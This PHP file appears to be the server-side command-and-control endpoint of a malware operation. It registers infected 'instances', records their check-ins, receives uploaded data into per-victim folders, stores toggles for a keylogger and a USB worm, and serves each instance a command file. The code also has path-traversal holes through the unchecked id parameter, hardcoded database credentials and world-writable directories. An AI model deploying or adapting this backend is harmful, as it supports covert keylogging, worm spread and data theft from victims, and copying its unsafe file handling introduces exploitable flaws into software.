<?php
// Check if ID parameter is set
if(isset($_GET['id'])) {
    // Get the user ID from the URL parameter
    $userId = $_GET['id'];

    // Check if any data was received
    $inputData = file_get_contents("php://input");
    if (empty($inputData)) {
        // If there's no data, check if the ID exists in the database and if a folder with that ID exists
        $mysqli = new mysqli("localhost", "toor", "toor", "connections");

        // Check connection
        if ($mysqli->connect_errno) {
            echo json_encode(array("success" => false, "message" => "Database connection error: " . $mysqli->connect_error));
            exit;
        }

        // Escape user ID
        $userId = $mysqli->real_escape_string($userId);

        // Check if the user ID exists in the database
        $query = "SELECT COUNT(*) FROM instances WHERE id = '$userId'";
        $result = $mysqli->query($query);
        if ($result && $result->fetch_row()[0] == 0) {
            // If the ID doesn't exist in the database, create the folder and insert the ID into the database
            if (!file_exists($_SERVER['DOCUMENT_ROOT'] . "/downloaded_media/$userId")) {
                // Create directory recursively
                if (!mkdir($_SERVER['DOCUMENT_ROOT'] . "/downloaded_media/$userId", 0777, true)) {
                    echo json_encode(array("success" => false, "message" => "Error creating directory."));
                    exit;
                }
            }
            // Check if the API file exists
            $apiFile = $_SERVER['DOCUMENT_ROOT'] . "/api/api-$userId.txt";
            if (!file_exists($apiFile)) {
                // Create the file
                if (!touch($apiFile)) {
                    echo json_encode(array("success" => false, "message" => "Error creating API file."));
                    exit;
                }
            } else {
                // If the API file already exists, respond with an error
                echo json_encode(array("success" => false, "message" => "Error: API file already exists."));
                exit;
            }

            // Insert data into instances table
            $timestamp = date('Y-m-d H:i:s');
            $query1 = "INSERT INTO instances (id, timestamp, last_connection) VALUES ('$userId', '$timestamp', '$timestamp')";
            $query2 = "INSERT INTO states (api, instance_id, state_keylogger, state_usbworm) VALUES ('0', '$userId', 'disabled', 'disabled')";

            if (!$mysqli->query($query1)) {
                echo json_encode(array("success" => false, "message" => "Error inserting data into database: " . $mysqli->error));
                //exit;
            }
            
            if (!$mysqli->query($query2)) {
                echo json_encode(array("success" => false, "message" => "Error inserting data into database table states: " . $mysqli->error));
                exit;
            }
            
            echo json_encode(array("success" => true, "message" => "Folder and API file created successfully."));
        } else {
            // If the ID exists in the database, update the last_connection timestamp
            $timestamp = date('Y-m-d H:i:s');
            $query = "UPDATE instances SET last_connection = '$timestamp' WHERE id = '$userId'";
            if (!$mysqli->query($query)) {
                echo json_encode(array("success" => false, "message" => "Error updating last connection timestamp: " . $mysqli->error));
                exit;
            }
            echo json_encode(array("success" => true, "message" => "Last connection timestamp updated successfully."));
        }
        // Close connection
        $mysqli->close();
    }else {
        // If there is data
        // Generate a unique filename using timestamp
        $timestamp = time();
        $filename = "upload-$timestamp";
    
        // Get the file extension
        $contentType = $_SERVER['CONTENT_TYPE'];
        $extension = pathinfo($contentType, PATHINFO_EXTENSION);
    
        // Set the path where the file will be saved
        $filePath = $_SERVER['DOCUMENT_ROOT'] . "/downloaded_media/$userId/$filename.$extension";
    
        // Save the file
        if (file_put_contents($filePath, $inputData) !== false) {
            echo json_encode(array("success" => true, "message" => "File uploaded successfully."));
        } else {
            echo json_encode(array("success" => false, "message" => "Error uploading file."));
        }
    }
    
} else {
    echo json_encode(array("success" => false, "message" => "Error: No user ID provided."));
}

// Serve the API file content
if(isset($_GET['id'])) {
    $userId = $_GET['id'];
    $apiFile = $_SERVER['DOCUMENT_ROOT'] . "/api/api-$userId.txt";
    if (file_exists($apiFile)) {
        // Update last connection timestamp
        $mysqli = new mysqli("localhost", "toor", "toor", "connections");
        $userId = $mysqli->real_escape_string($userId);
        $timestamp = date('Y-m-d H:i:s');
        $query = "UPDATE instances SET last_connection = '$timestamp' WHERE id = '$userId'";
        $mysqli->query($query);
        $mysqli->close();

        // Output API file content
        header('Content-Type: text/plain');
        readfile($apiFile);

        // Append a timestamp query parameter to the URL to ensure each request is unique
        echo "?timestamp=" . time();
    } else {
        echo json_encode(array("success" => false, "message" => "Error: API file not found."));
    }
} else {
    echo json_encode(array("success" => false, "message" => "Error: No user ID provided."));
}
?>
